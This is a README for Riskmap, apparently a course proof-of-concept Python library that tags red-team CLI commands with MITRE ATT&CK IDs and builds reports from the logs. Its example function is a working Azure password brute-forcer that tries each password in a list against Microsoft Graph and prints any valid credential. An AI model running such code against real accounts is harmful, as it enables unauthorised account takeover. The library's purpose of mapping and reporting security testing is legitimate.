# Riskmap

Python utility for red teaming and penetration testing CLI tools to map commands and modules to the MITRE ATT&CK framework. A sample CLI program has been provided in [riskcli.py](./samples/riskcli/riskcli.py)

## Basic Concept

This library provides a `AttckMapper` class with a `mapping` decorator that can be used on functions that perform an offensive technique.

_Example function:_

```python
@app.command()
@atmap.mapping(enterprise=["T1110.001", "M1032"])
def azbrute(
    username: str = typer.Option(..., "-u", help="Username to bruteforce"),
    passList: Path = typer.Option(..., "-p", help="Path to password list"),
):
    """Bruteforces password for an Azure account"""
    validCred = {"user": username, "pass": None}
    with open(passList, "r", encoding="latin-1") as passes:
        for pwd in passes.read().splitlines():
            login = UsernamePasswordCredential(
                "1950a258-227b-4e31-a9cf-717495945fc2", username, pwd
            )
            try:
                token = login.get_token("https://graph.microsoft.com/.default")
                validCred["pass"] = pwd
            except ClientAuthenticationError as e:
                pass

    if not validCred["pass"]:
        raise CommandUnsuccessfulError(f"Brute force for {username} unsuccessful")
    typer.echo(f"\nCredential found! - {validCred}\n")
```

The decorator function will perform as normal and actions will be logged. When a report is generated, the IDs are looked up to provide a comprehensive description of what events took place, the techniques involved, and any additional references found in the MITRE matrices (CWE, CAPEC, etc).

_Report Generation Example:_

```python
@app.command()
def genreport(path: Path = typer.Argument(..., help="Path to riskmap log")):
    rrg = RiskmapReportGenerator(path)
    rrg.to_excel("output-report.xlsx")
```

This library has been tested with the [Typer](https://typer.tiangolo.com/) and therefore should also work with the [Click](https://github.com/pallets/click) library as well. By all accounts, the decorator should work with any normal synchronous function.

### Note

**_This library was written for Dakota State University's Managing Security Risk course and may not be maintained in the future. This is a proof-of-concept._**
